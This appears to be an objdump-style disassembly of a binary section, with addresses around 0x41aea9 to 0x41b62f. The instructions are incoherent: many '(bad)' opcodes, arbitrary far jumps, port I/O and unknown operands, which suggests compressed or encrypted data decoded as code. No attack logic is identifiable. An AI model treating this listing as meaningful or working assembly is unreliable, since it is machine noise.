  41aea9:	std    
  41aeaa:	xchg   esi,eax
  41aeab:	sbb    al,ch
  41aead:	lock test BYTE PTR ds:0x79daca68,dl
  41aeb4:	dec    DWORD PTR [eax+0x43]
  41aeb7:	mov    dh,0x5e
  41aeb9:	inc    edx
  41aeba:	mov    cl,0x2a
  41aebc:	sbb    ebx,DWORD PTR [esi-0x350bfa36]
  41aec2:	inc    edx
  41aec3:	xchg   ebp,eax
  41aec4:	pop    edi
  41aec5:	push   0x1a
  41aec7:	ins    DWORD PTR es:[edi],dx
  41aec8:	jmp    0x7e0ed665
  41aecd:	xchg   BYTE PTR [edi],bl
  41aecf:	sub    DWORD PTR [eax-0x700710ea],edx
  41aed5:	fisttp DWORD PTR [eax+0x23070136]
  41aedb:	inc    edi
  41aedc:	dec    esi
  41aedd:	sub    al,0xbd
  41aedf:	cmp    eax,0x3d656605
  41aee4:	es retf 
  41aee6:	imul   edi,eax,0xffffffaf
  41aee9:	and    al,0x56
  41aeeb:	mov    esi,0xfcd78767
  41aef0:	mov    dl,0xb5
  41aef2:	xchg   esi,eax
  41aef3:	in     eax,dx
  41aef4:	dec    esi
  41aef5:	sbb    BYTE PTR [eax],dh
  41aef7:	mov    dl,0x21
  41aef9:	out    0x6f,eax
  41aefb:	int3   
  41aefc:	pusha  
  41aefd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aefe:	xor    dh,cl
  41af00:	out    0xe2,al
  41af02:	mov    BYTE PTR [ecx-0x7c6f684b],dh
  41af08:	mov    BYTE PTR [edx+edx*1-0x7d],bh
  41af0c:	fs jmp 0xc327f6b8
  41af12:	mov    ds:0xee1e1aa0,al
  41af17:	out    0x1e,al
  41af19:	mov    BYTE PTR [ebp-0x15043ed6],ah
  41af1f:	jno    0x41af73
  41af21:	sbb    DWORD PTR [esi-0x4075984],esp
  41af27:	daa    
  41af28:	outs   dx,BYTE PTR ds:[esi]
  41af29:	mov    dl,0x9a
  41af2b:	inc    esp
  41af2c:	xchg   DWORD PTR [ebx-0x2b8a08d6],ecx
  41af32:	call   0x1ec4b529
  41af37:	xchg   ebp,eax
  41af38:	jle    0x41af81
  41af3a:	pop    esp
  41af3b:	xchg   esi,eax
  41af3c:	jmp    0x41af36
  41af3e:	inc    esi
  41af3f:	call   0x2afb:0xd8c9265c
  41af46:	(bad)  
  41af47:	mov    al,ds:0x55bcb315
  41af4c:	cmp    edx,edx
  41af4e:	pop    es
  41af4f:	gs cli 
  41af51:	scas   eax,DWORD PTR es:[edi]
  41af52:	std    
  41af53:	sub    ah,BYTE PTR [edx-0x7f176459]
  41af59:	mov    esi,0xcc076dff
  41af5e:	mov    WORD PTR [esi],gs
  41af60:	lods   eax,DWORD PTR ds:[esi]
  41af61:	push   ebp
  41af62:	mov    edi,0x195028e7
  41af67:	cdq    
  41af68:	push   ebx
  41af69:	mov    BYTE PTR [edi+0x697b8d3f],ch
  41af6f:	call   0xc2579fbb
  41af74:	push   ss
  41af75:	inc    edi
  41af76:	(bad)  [esp+ebx*8-0x50]
  41af7a:	and    dl,BYTE PTR [ebx+0x65]
  41af7d:	outs   dx,BYTE PTR ds:[esi]
  41af7e:	mov    ch,BYTE PTR [eax+0x53]
  41af81:	cld    
  41af82:	mov    ch,0xd4
  41af84:	mov    ch,0xb7
  41af86:	fcomp  QWORD PTR [esi-0x67]
  41af89:	or     dh,BYTE PTR [ecx-0x11]
  41af8c:	inc    DWORD PTR ds:[eax+0x0]
  41af90:	xor    al,0xe3
  41af92:	loopne 0x41afc4
  41af94:	sbb    eax,0xe646bc15
  41af99:	mov    BYTE PTR [eax+ecx*2-0x14dd4aae],bh
  41afa0:	mov    bh,0x9a
  41afa2:	(bad)  
  41afa4:	outs   dx,BYTE PTR ds:[esi]
  41afa5:	enter  0xe464,0x96
  41afa9:	pop    eax
  41afaa:	(bad)  
  41afab:	aad    0x30
  41afad:	sbb    BYTE PTR [edi+ebx*1],0xcf
  41afb1:	out    dx,al
  41afb2:	jne    0x41afa6
  41afb4:	ror    esi,0x88
  41afb7:	out    0x1f,al
  41afb9:	cmp    dl,dh
  41afbb:	xchg   edx,eax
  41afbc:	dec    ebp
  41afbd:	repnz sub BYTE PTR [ecx],0x7d
  41afc1:	inc    eax
  41afc2:	cmp    eax,DWORD PTR [eax-0x6ad6e103]
  41afc8:	fsubr  DWORD PTR [ebx+0x7ef78165]
  41afce:	mov    ds:0xdc8d59b4,al
  41afd3:	pop    esp
  41afd4:	repnz out 0xcb,eax
  41afd7:	out    0xee,al
  41afd9:	pop    eax
  41afda:	lock sbb al,0x78
  41afdd:	fimul  WORD PTR [ecx-0xa22f0d]
  41afe3:	mov    dh,BYTE PTR [ebx+0x15f8336c]
  41afe9:	add    ebp,DWORD PTR [edx+0x2e18ae15]
  41afef:	nop
  41aff0:	sub    eax,0xa7a9fc5c
  41aff5:	hlt    
  41aff6:	lea    esp,[edi]
  41aff8:	sub    dl,BYTE PTR [eax]
  41affa:	addr16 jae 0x41b05c
  41affd:	test   BYTE PTR [eax-0x3b],0x34
  41b001:	jns    0x41b014
  41b003:	fisub  WORD PTR [ebx-0x3a344bc]
  41b009:	cld    
  41b00a:	inc    esi
  41b00b:	fidivr WORD PTR [edx+0x20]
  41b00e:	sub    eax,0x15c4bd98
  41b013:	adc    eax,0x47a5c0d5
  41b018:	xchg   ecx,eax
  41b019:	inc    ebx
  41b01a:	js     0x41b072
  41b01c:	pop    eax
  41b01d:	test   BYTE PTR [esi-0xc],al
  41b020:	or     BYTE PTR [edx],dl
  41b022:	stos   BYTE PTR es:[edi],al
  41b023:	rcr    DWORD PTR [ebp-0x52],1
  41b026:	jae    0x41b04d
  41b028:	or     al,0x77
  41b02a:	lods   eax,DWORD PTR ds:[esi]
  41b02b:	call   0xece5a963
  41b030:	in     eax,dx
  41b031:	enter  0x2882,0xec
  41b035:	in     eax,dx
  41b036:	repz fs mov edx,0x63a1d84f
  41b03d:	addr16 sti 
  41b03f:	cmp    dh,BYTE PTR [eax]
  41b041:	mov    bl,0xd4
  41b043:	scas   al,BYTE PTR es:[edi]
  41b044:	(bad)  
  41b046:	push   edi
  41b047:	addr16 in eax,dx
  41b049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b04a:	jmp    0x38d7:0xc53f1dea
  41b051:	cmp    DWORD PTR [esi+0x11],esi
  41b054:	add    eax,0xd6c6fd22
  41b059:	sti    
  41b05a:	push   ds
  41b05b:	xchg   edi,eax
  41b05c:	test   eax,0xb1ffe497
  41b061:	stos   BYTE PTR es:[edi],al
  41b062:	mov    esi,0xe7f7456c
  41b067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b068:	add    DWORD PTR [edi-0x3],eax
  41b06b:	sub    dh,dh
  41b06d:	jle    0x41b014
  41b06f:	aam    0xb8
  41b071:	js     0x41b039
  41b073:	sbb    dh,BYTE PTR [edx+0x580c8254]
  41b079:	add    esi,edx
  41b07b:	add    esi,DWORD PTR [ebx+0x3]
  41b07e:	push   ebx
  41b07f:	pop    ds
  41b080:	rol    BYTE PTR [edx-0xa454d57],1
  41b086:	clc    
  41b087:	cmp    BYTE PTR [edx],0xe9
  41b08a:	cmp    BYTE PTR gs:[ebx+0x7d],bh
  41b08e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b08f:	dec    edx
  41b090:	ja     0x41b105
  41b092:	add    cl,BYTE PTR [edi]
  41b094:	sub    edx,ebp
  41b096:	mov    esi,esi
  41b098:	ret    
  41b099:	(bad)  
  41b09b:	fstp   DWORD PTR [esi]
  41b09d:	mov    dl,0xe5
  41b09f:	and    ebp,DWORD PTR [edx]
  41b0a1:	jo     0x41b0f5
  41b0a3:	push   0xffffffce
  41b0a5:	mov    esi,0xefacccb
  41b0ab:	push   cs
  41b0ac:	pop    ebp
  41b0ad:	pop    es
  41b0ae:	enter  0xbe42,0xdb
  41b0b2:	stos   BYTE PTR es:[di],al
  41b0b4:	jmp    FWORD PTR [esi]
  41b0b6:	mov    ds:0x4bd591be,eax
  41b0bb:	bound  ebp,QWORD PTR [esi+0x7a2ff0f0]
  41b0c1:	rcr    BYTE PTR [edx-0x4a7ff3f2],1
  41b0c7:	arpl   sp,dx
  41b0c9:	dec    edx
  41b0ca:	push   edx
  41b0cb:	sub    edi,ebp
  41b0cd:	inc    eax
  41b0ce:	enter  0x99e5,0x81
  41b0d2:	ins    BYTE PTR es:[edi],dx
  41b0d3:	jo     0x41b0b3
  41b0d5:	cwde   
  41b0d6:	xchg   ebx,eax
  41b0d7:	std    
  41b0d8:	out    0xa0,al
  41b0da:	xchg   esi,eax
  41b0db:	mov    ebp,0x76c55ad4
  41b0e0:	mov    edx,0x19134746
  41b0e5:	xlat   BYTE PTR ds:[ebx]
  41b0e6:	add    BYTE PTR [ebx-0x6955f8f8],al
  41b0ec:	sti    
  41b0ed:	addr16 sar edi,cl
  41b0f0:	jmp    0xb22:0xfb2a5c2f
  41b0f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0f8:	(bad)  
  41b0f9:	dec    ebx
  41b0fa:	(bad)  
  41b0fb:	and    al,cl
  41b0fd:	ret    0x100f
  41b100:	fidivr DWORD PTR [ebx-0x1b8389ff]
  41b106:	mov    cl,0xb6
  41b108:	xor    eax,0xad5d762c
  41b10d:	clc    
  41b10e:	cmp    al,0x3e
  41b110:	es std 
  41b112:	sub    ebp,DWORD PTR [esi-0x68]
  41b115:	cmp    DWORD PTR [edi-0x109c9dfd],ebx
  41b11b:	and    eax,0x8b7b2a3e
  41b120:	pop    ebp
  41b121:	scas   ax,WORD PTR es:[edi]
  41b123:	and    al,0x69
  41b125:	int    0x40
  41b127:	sub    ecx,esp
  41b129:	rcl    BYTE PTR [edi+0x41fe72bc],cl
  41b12f:	mov    ch,BYTE PTR [ecx]
  41b131:	mov    ebx,0xee4cfc02
  41b136:	jnp    0x41b13a
  41b138:	push   ecx
  41b139:	inc    edi
  41b13a:	jg     0x41b122
  41b13c:	imul   edx,edx,0x81d09d91
  41b142:	mov    ecx,0x787dcf4
  41b147:	cmp    DWORD PTR [eax+0x40],esp
  41b14a:	std    
  41b14b:	cwde   
  41b14c:	aaa    
  41b14d:	pop    ss
  41b14e:	in     eax,dx
  41b14f:	enter  0xbb63,0xbf
  41b153:	test   BYTE PTR [ebx+0x638b7f1],bl
  41b159:	hlt    
  41b15a:	ins    DWORD PTR es:[edi],dx
  41b15b:	out    0xc7,al
  41b15d:	ss test eax,0xd39f5f25
  41b163:	dec    esi
  41b164:	(bad)  
  41b165:	pusha  
  41b166:	mov    cl,0xb9
  41b168:	clc    
  41b169:	imul   ebx,DWORD PTR ds:0x6a04915e,0x54
  41b170:	test   BYTE PTR [ebx+0x36],0xfe
  41b174:	xor    eax,0x9bde10a1
  41b179:	mov    dh,0xe4
  41b17b:	sbb    esp,edx
  41b17d:	xor    al,0x30
  41b17f:	xchg   DWORD PTR [ebp-0xad6d935],ecx
  41b185:	data16 stos BYTE PTR es:[edi],al
  41b187:	repnz fisttp DWORD PTR [edx+0xd52c9f0]
  41b18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b18f:	jecxz  0x41b13c
  41b191:	jns    0x41b178
  41b193:	das    
  41b194:	scas   eax,DWORD PTR es:[edi]
  41b195:	shl    esp,0x61
  41b198:	stc    
  41b199:	jne    0x41b1b6
  41b19b:	repz xlat BYTE PTR ds:[ebx]
  41b19d:	sub    esp,ecx
  41b19f:	or     ch,dl
  41b1a1:	dec    BYTE PTR [eax-0x18]
  41b1a4:	add    ecx,DWORD PTR [esi+0x5b]
  41b1a7:	jmp    0x8e32983b
  41b1ac:	(bad)  
  41b1ad:	xchg   ecx,eax
  41b1ae:	cli    
  41b1af:	mov    BYTE PTR [ecx+0x75],dh
  41b1b2:	or     al,0xfd
  41b1b4:	out    dx,al
  41b1b5:	xlat   BYTE PTR ds:[ebx]
  41b1b6:	mov    ds:0x97bc5984,al
  41b1bb:	fisubr WORD PTR [edx+eax*2+0x13]
  41b1bf:	sub    DWORD PTR [edi+eiz*8],edi
  41b1c2:	inc    esi
  41b1c3:	popa   
  41b1c4:	outs   dx,DWORD PTR ds:[esi]
  41b1c5:	retf   0xf95b
  41b1c8:	sbb    al,0x31
  41b1ca:	push   es
  41b1cb:	mov    eax,ds:0x2a8caa3b
  41b1d0:	loop   0x41b1ab
  41b1d2:	imul   edx,DWORD PTR [ecx+0x5327d0fe],0xdb855b9f
  41b1dc:	aas    
  41b1dd:	cdq    
  41b1de:	jle    0x41b21e
  41b1e0:	das    
  41b1e1:	das    
  41b1e2:	pop    es
  41b1e3:	arpl   bp,sp
  41b1e5:	jmp    0x340f:0xac15028b
  41b1ec:	dec    eax
  41b1ed:	push   edx
  41b1ee:	mov    esi,0xf0ae6e61
  41b1f3:	add    eax,0xe1baac36
  41b1f8:	fdivr  DWORD PTR [edi-0x19]
  41b1fb:	xchg   ebx,eax
  41b1fc:	not    BYTE PTR [edi+0x7f]
  41b1ff:	xchg   ebp,eax
  41b200:	mov    ch,0xc2
  41b202:	xchg   esp,eax
  41b203:	fild   DWORD PTR [ecx]
  41b205:	imul   edx,DWORD PTR [edx],0xffffff8d
  41b208:	jge    0x41b279
  41b20a:	das    
  41b20b:	mov    al,0x4f
  41b20d:	in     al,dx
  41b20e:	loope  0x41b1eb
  41b210:	sbb    eax,0xf3841ef3
  41b215:	imul   ebp,DWORD PTR [edi+0x1a12754b],0xad2c8f18
  41b21f:	ja     0x41b1ad
  41b221:	mov    ch,0x42
  41b223:	xchg   edx,eax
  41b224:	pop    es
  41b225:	sub    cl,BYTE PTR [eax]
  41b227:	in     al,dx
  41b228:	mov    cl,0x72
  41b22a:	pop    es
  41b22b:	cmp    edi,DWORD PTR [edi+0x2d]
  41b22e:	inc    esp
  41b22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b230:	outs   dx,BYTE PTR ds:[esi]
  41b231:	add    edx,DWORD PTR [ebp-0x6fea2eaa]
  41b237:	or     eax,0xdefd1933
  41b23c:	repz rcr DWORD PTR [edx-0x4a7b0265],0xbd
  41b244:	fwait
  41b245:	cli    
  41b246:	(bad)
  41b249:	sbb    edi,DWORD PTR [esi+0x4707b465]
  41b24f:	sub    ebp,DWORD PTR [eax+0x3237d7c]
  41b255:	fdivr  QWORD PTR [edi+0x6e]
  41b258:	sbb    eax,0xd0d83d08
  41b25d:	loope  0x41b296
  41b25f:	loopne 0x41b2da
  41b261:	fld    TBYTE PTR [eax+0x6b5a68c1]
  41b267:	lds    ebp,FWORD PTR [ecx]
  41b269:	pop    ds
  41b26a:	dec    eax
  41b26b:	xchg   BYTE PTR [ecx-0x7d5bf28b],ah
  41b271:	pop    ecx
  41b272:	adc    ebx,DWORD PTR [esi]
  41b274:	adc    DWORD PTR [ebp-0x40257a30],esp
  41b27a:	call   0xcd9a:0xa4382d43
  41b281:	inc    ebp
  41b282:	dec    ebp
  41b283:	jmp    0x41b2e8
  41b285:	aad    0x42
  41b287:	pop    es
  41b288:	mov    cl,0xbf
  41b28a:	pusha  
  41b28b:	xchg   bl,bl
  41b28d:	mov    dl,0x20
  41b28f:	js     0x41b2c6
  41b291:	iret   
  41b292:	mov    cl,0x40
  41b294:	es cmovb esp,ebp
  41b298:	cmp    DWORD PTR [esi-0x5],ebp
  41b29b:	adc    dh,al
  41b29d:	jmp    0x3c5f6f8
  41b2a2:	rol    DWORD PTR [edx],cl
  41b2a4:	sub    DWORD PTR [ecx-0x397c9654],ecx
  41b2aa:	or     DWORD PTR [esi],esp
  41b2ac:	lods   eax,DWORD PTR ds:[esi]
  41b2ad:	or     BYTE PTR [eax+0x19],0xc9
  41b2b1:	pop    edx
  41b2b2:	retf   0x1367
  41b2b5:	inc    esi
  41b2b6:	mov    edi,0xac9ed41e
  41b2bb:	add    edx,eax
  41b2bd:	xchg   ebx,eax
  41b2be:	pop    eax
  41b2bf:	leave  
  41b2c0:	leave  
  41b2c1:	cmp    BYTE PTR [edi+0x5cce9223],ch
  41b2c7:	retf   
  41b2c8:	mov    esi,0xac3b8e16
  41b2cd:	pop    ss
  41b2ce:	inc    esp
  41b2cf:	sbb    bh,cl
  41b2d1:	aad    0xd8
  41b2d3:	push   ss
  41b2d4:	int3   
  41b2d5:	call   0xb0e90f5b
  41b2da:	pop    ebx
  41b2db:	leave  
  41b2dc:	jne    0x41b2f5
  41b2de:	loop   0x41b35f
  41b2e0:	adc    BYTE PTR [ebp+ebp*2-0x33e64a61],cl
  41b2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2e8:	sbb    DWORD PTR [ebx+ebp*4],edi
  41b2eb:	aam    0xf0
  41b2ed:	pop    esp
  41b2ee:	shl    DWORD PTR [eax+0x2],cl
  41b2f1:	xor    DWORD PTR [edx+0x72d8e6fe],esi
  41b2f7:	jne    0x41b32b
  41b2f9:	mov    edi,0x184cb6fc
  41b2fe:	xor    DWORD PTR [ebp-0x140f4c50],edi
  41b304:	xchg   DWORD PTR [eax-0x7b123fba],ecx
  41b30a:	mov    ch,0x88
  41b30c:	arpl   WORD PTR [eax+ecx*8+0x3a],dx
  41b310:	jbe    0x41b380
  41b312:	gs mov ch,0xa1
  41b315:	fstp   QWORD PTR [edi-0x1b]
  41b318:	enter  0xa908,0x44
  41b31c:	neg    dh
  41b31e:	and    edi,DWORD PTR [esi+0x7bd4f644]
  41b324:	(bad)  
  41b326:	iret   
  41b327:	jbe    0x41b34b
  41b329:	mov    ch,0xef
  41b32b:	push   es
  41b32c:	push   es
  41b32d:	jg     0x41b2b6
  41b32f:	mov    dl,0x4d
  41b331:	lods   eax,DWORD PTR ds:[esi]
  41b332:	push   ss
  41b333:	gs jb  0x41b323
  41b336:	push   ebx
  41b337:	mov    esp,0xb053cb
  41b33c:	and    BYTE PTR [ebp+0x23],dl
  41b33f:	sar    BYTE PTR [edi],cl
  41b341:	cs repz daa 
  41b344:	cdq    
  41b345:	dec    esi
  41b346:	loopne 0x41b3a5
  41b348:	jmp    0xae73:0xf71393ed
  41b34f:	sbb    dh,BYTE PTR [edi-0x7d3b9321]
  41b355:	xchg   esp,eax
  41b356:	dec    edi
  41b357:	dec    eax
  41b358:	scas   al,BYTE PTR es:[edi]
  41b359:	out    dx,al
  41b35a:	jae    0x41b30f
  41b35c:	xchg   esi,eax
  41b35d:	xchg   ebp,eax
  41b35e:	lahf   
  41b35f:	ret    
  41b360:	and    eax,0xf19d7095
  41b365:	sti    
  41b366:	mov    edx,0x90bf2c8
  41b36b:	dec    esp
  41b36c:	push   esp
  41b36d:	icebp  
  41b36e:	ins    DWORD PTR es:[edi],dx
  41b36f:	jnp    0x41b2f7
  41b371:	pop    ss
  41b372:	(bad)  
  41b373:	mov    edi,0x6b07a6a1
  41b378:	cmp    esi,ebx
  41b37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b37b:	(bad)  
  41b37c:	push   ebp
  41b37d:	bound  esi,QWORD PTR [edx]
  41b37f:	loop   0x41b382
  41b381:	or     eax,0x5d0ab7bb
  41b386:	pop    es
  41b387:	push   esp
  41b388:	scas   al,BYTE PTR es:[edi]
  41b389:	fstp   TBYTE PTR [ebx-0x32]
  41b38c:	pavgb  mm0,QWORD PTR [ecx]
  41b38f:	cmp    dh,cl
  41b391:	xchg   esp,eax
  41b392:	rcl    ah,1
  41b394:	dec    esp
  41b395:	jae    0x41b34f
  41b397:	rol    BYTE PTR [eax-0x5ea3bfa2],cl
  41b39d:	dec    edi
  41b39e:	adc    ch,ch
  41b3a0:	outs   dx,DWORD PTR ds:[esi]
  41b3a1:	stos   BYTE PTR es:[edi],al
  41b3a2:	call   0x400cdda5
  41b3a7:	(bad)  
  41b3a8:	out    dx,al
  41b3a9:	out    0xc,eax
  41b3ab:	ds jl  0x41b42a
  41b3ae:	pop    ebx
  41b3af:	add    eax,DWORD PTR [edi-0x7b]
  41b3b2:	les    edx,FWORD PTR [edi]
  41b3b4:	adc    BYTE PTR [edx-0x335bf180],dl
  41b3ba:	retf   0x696b
  41b3bd:	ss adc eax,0x5dbd2625
  41b3c3:	inc    edx
  41b3c4:	fs fild QWORD PTR ds:[eax+0x70]
  41b3c9:	call   0x965c:0x89d890ef
  41b3d0:	inc    ebp
  41b3d1:	push   0x30
  41b3d3:	mov    esp,0x8185ae5c
  41b3d8:	ds loop 0x41b3fd
  41b3db:	pop    ds
  41b3dc:	push   ebx
  41b3dd:	loop   0x41b39e
  41b3df:	call   0xe9186380
  41b3e4:	es mov dh,0x91
  41b3e7:	push   ebp
  41b3e8:	jne    0x41b433
  41b3ea:	enter  0x98aa,0x27
  41b3ee:	mov    ah,0x89
  41b3f0:	or     al,0x5e
  41b3f2:	sbb    ah,cl
  41b3f4:	fcom   DWORD PTR [esi+ebp*4+0x6c]
  41b3f8:	dec    esp
  41b3f9:	mov    ah,0xbe
  41b3fb:	rol    BYTE PTR [ebx-0x7b],1
  41b3fe:	sbb    BYTE PTR [ebx-0x2715fa14],bl
  41b404:	das    
  41b405:	(bad)  
  41b406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b407:	aas    
  41b408:	inc    esp
  41b409:	aam    0x90
  41b40b:	test   eax,0x27a6a3f5
  41b410:	pop    edi
  41b411:	mov    ah,BYTE PTR [ecx+0x1a]
  41b414:	dec    edx
  41b415:	cmp    BYTE PTR [ebp+0x5f87df90],dh
  41b41b:	loopne 0x41b440
  41b41d:	jge    0x41b49c
  41b41f:	mov    ds:0x39b331c3,eax
  41b424:	loope  0x41b41b
  41b426:	xchg   ah,cl
  41b428:	outs   dx,BYTE PTR ds:[esi]
  41b429:	pop    es
  41b42a:	popf   
  41b42b:	aas    
  41b42c:	fwait
  41b42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b42e:	in     al,dx
  41b42f:	fadd   DWORD PTR [edi+0xe20b98c]
  41b435:	xlat   BYTE PTR ds:[ebx]
  41b436:	mov    dl,BYTE PTR [esi+eax*4]
  41b439:	dec    esp
  41b43a:	popa   
  41b43b:	das    
  41b43c:	sbb    al,0xab
  41b43e:	sti    
  41b43f:	cmp    eax,DWORD PTR [ebp+0x44]
  41b442:	push   ebx
  41b443:	dec    eax
  41b444:	jnp    0x41b3d1
  41b446:	jge    0x41b4a8
  41b448:	cmp    al,0x39
  41b44a:	cmovns ecx,DWORD PTR [ecx]
  41b44d:	push   0xb9e28cb6
  41b452:	fcom   QWORD PTR [ebx]
  41b454:	push   DWORD PTR [edx+eax*8+0x25a6515d]
  41b45b:	push   eax
  41b45c:	enter  0x4a99,0x21
  41b460:	(bad)  
  41b461:	xor    DWORD PTR [edi],esi
  41b463:	pop    ecx
  41b464:	mov    esi,0x825a0b3f
  41b469:	in     eax,0x15
  41b46b:	mov    eax,ds:0xcfb81f3d
  41b470:	mul    DWORD PTR [edi-0x2a2a2121]
  41b476:	ins    DWORD PTR es:[edi],dx
  41b477:	lods   al,BYTE PTR ds:[esi]
  41b478:	dec    esi
  41b479:	mov    al,0x78
  41b47b:	xchg   DWORD PTR [eax+0x4b4c8ded],ebx
  41b481:	cli    
  41b482:	(bad)  
  41b483:	gs sub eax,0xfbd2d04f
  41b489:	xchg   esi,eax
  41b48a:	pop    es
  41b48b:	(bad)  
  41b48d:	ficomp WORD PTR [ecx]
  41b48f:	rcr    DWORD PTR [ecx+ebp*4+0x1b9d147a],cl
  41b496:	(bad)  
  41b497:	dec    ebx
  41b498:	xor    eax,0x146a2451
  41b49d:	adc    BYTE PTR [ebx-0x6488bc10],bh
  41b4a3:	pop    ds
  41b4a4:	and    al,dh
  41b4a6:	inc    eax
  41b4a7:	arpl   WORD PTR [edi-0x5c],dx
  41b4aa:	or     BYTE PTR [ecx+0x6a0ce2e2],0x53
  41b4b1:	mov    al,bh
  41b4b3:	outs   dx,BYTE PTR ds:[esi]
  41b4b4:	ja     0x41b44f
  41b4b6:	iret   
  41b4b7:	xor    BYTE PTR [edx-0x67],dl
  41b4ba:	adc    al,0xec
  41b4bc:	ins    DWORD PTR es:[edi],dx
  41b4bd:	jnp    0x41b448
  41b4bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4c0:	add    eax,edx
  41b4c2:	mov    ecx,0xe2f1dbf8
  41b4c7:	ret    0x7fab
  41b4ca:	pop    edx
  41b4cb:	lds    ebp,FWORD PTR [ebp+0x186c3504]
  41b4d1:	daa    
  41b4d2:	mov    eax,ds:0x83e08772
  41b4d7:	sub    al,0x5c
  41b4d9:	shl    DWORD PTR [ecx+0x265fb390],1
  41b4df:	repz jle 0x41b494
  41b4e2:	pusha  
  41b4e3:	cmp    al,0x95
  41b4e5:	sbb    al,0xc4
  41b4e7:	pop    esi
  41b4e8:	xor    BYTE PTR [edi+0x4f614092],0xa6
  41b4ef:	sub    dl,BYTE PTR [edx]
  41b4f1:	enter  0x115f,0x3c
  41b4f5:	mov    ch,BYTE PTR [ecx+0x409f4994]
  41b4fb:	add    cl,ch
  41b4fd:	ror    DWORD PTR [eax],1
  41b4ff:	sbb    al,BYTE PTR [ebp+0x49]
  41b502:	fdiv   QWORD PTR [ecx+edi*4]
  41b505:	fnsave ds:0x75334a3
  41b50b:	push   0x17d3a096
  41b510:	mov    BYTE PTR [ecx-0x46450069],ah
  41b516:	push   0xabeb6c65
  41b51b:	mov    ds:0x813c369a,eax
  41b520:	inc    eax
  41b521:	out    dx,al
  41b522:	ror    BYTE PTR ds:[eax+0x79ffe1e3],0x88
  41b52a:	sub    DWORD PTR [ebx],ebx
  41b52c:	test   eax,0x6a8e11d8
  41b531:	fs aaa 
  41b533:	mul    BYTE PTR [ebx]
  41b535:	pop    ebx
  41b536:	jbe    0x41b595
  41b538:	inc    esi
  41b539:	mov    ?,WORD PTR [edi]
  41b53b:	ss push ds
  41b53d:	cmp    DWORD PTR [ebx+0x294efbe3],ebp
  41b543:	and    al,0xa7
  41b545:	fwait
  41b546:	add    ch,BYTE PTR [esi+0x3c]
  41b549:	lods   eax,DWORD PTR ds:[esi]
  41b54a:	xchg   esp,eax
  41b54b:	jp     0x41b588
  41b54d:	shl    DWORD PTR ds:0x588220a8,1
  41b553:	push   edx
  41b554:	push   ds
  41b555:	inc    esp
  41b556:	xchg   esp,eax
  41b557:	stos   DWORD PTR es:[edi],eax
  41b558:	fisttp QWORD PTR [esi+0x11]
  41b55b:	lea    esp,[ecx]
  41b55d:	xchg   ecx,eax
  41b55e:	push   cs
  41b55f:	int3   
  41b560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b561:	push   ss
  41b562:	sub    eax,0xd2bd1a2b
  41b567:	xchg   ebp,eax
  41b568:	sub    DWORD PTR [ebx-0x3a],ebx
  41b56b:	add    eax,0x79d7ef76
  41b570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b572:	in     al,0x91
  41b574:	mov    edx,0xf417cf62
  41b579:	jno    0x41b534
  41b57b:	mov    WORD PTR [esi+eiz*8],?
  41b57e:	mov    edx,0x67472364
  41b583:	lock out dx,eax
  41b585:	bound  ebp,QWORD PTR [edi+0x6007826]
  41b58b:	sbb    ah,BYTE PTR [edi+0x6e]
  41b58e:	call   0x1460:0xa7611e12
  41b595:	nop
  41b596:	repz daa 
  41b598:	sub    eax,0x99d34602
  41b59d:	mov    cl,0x80
  41b59f:	cmc    
  41b5a0:	les    esi,FWORD PTR [ecx]
  41b5a2:	mov    al,ds:0x9e5afc95
  41b5a7:	pop    ebp
  41b5a8:	dec    esi
  41b5a9:	call   0x69f97129
  41b5ae:	scas   al,BYTE PTR es:[edi]
  41b5af:	scas   al,BYTE PTR es:[edi]
  41b5b0:	jno    0x41b559
  41b5b2:	sub    eax,0xcf8cf1bf
  41b5b7:	jmp    0x6289:0x8173d490
  41b5be:	mov    esp,0x25021be0
  41b5c3:	in     eax,dx
  41b5c4:	fidivr DWORD PTR [ebx-0x1f]
  41b5c7:	mov    edi,0x279351c1
  41b5cc:	pop    ds
  41b5cd:	xlat   BYTE PTR ds:[ebx]
  41b5ce:	call   0x4241c377
  41b5d3:	test   BYTE PTR [edi+ebp*1+0x29bc8199],dl
  41b5da:	push   es
  41b5db:	test   BYTE PTR [ecx],ch
  41b5dd:	jmp    0x7e20:0x5820caab
  41b5e4:	test   eax,0x6ffcf05a
  41b5e9:	ins    DWORD PTR es:[edi],dx
  41b5ea:	test   BYTE PTR [edi+0x15],0xe
  41b5ee:	jae    0x41b5fe
  41b5f0:	pop    eax
  41b5f1:	inc    esp
  41b5f2:	loop   0x41b5da
  41b5f4:	rcl    DWORD PTR [ecx],1
  41b5f6:	sub    eax,0x68ca2a07
  41b5fb:	inc    esi
  41b5fc:	ins    DWORD PTR es:[edi],dx
  41b5fd:	pop    ebx
  41b5fe:	rcl    ebp,1
  41b600:	(bad)  [ebx-0xd723f43]
  41b606:	inc    eax
  41b607:	mov    bh,0xf7
  41b609:	daa    
  41b60a:	fadd   DWORD PTR [ebx]
  41b60c:	xchg   DWORD PTR [ebx-0x3313283f],ebp
  41b612:	inc    esp
  41b613:	jns    0x41b67b
  41b615:	mov    al,ds:0x5d5f2736
  41b61a:	(bad)  
  41b61b:	loope  0x41b65b
  41b61d:	push   esi
  41b61e:	cmp    edx,DWORD PTR fs:[ebx]
  41b621:	rcl    bh,cl
  41b623:	inc    esp
  41b624:	cmp    BYTE PTR [ecx-0x3],0x52
  41b628:	pop    ds
  41b629:	mov    ebp,?
  41b62b:	popa   
  41b62c:	jp     0x41b655
  41b62e:	stos   DWORD PTR es:[edi],eax
  41b62f:	mov    ebp,DWORD PTR [edi]
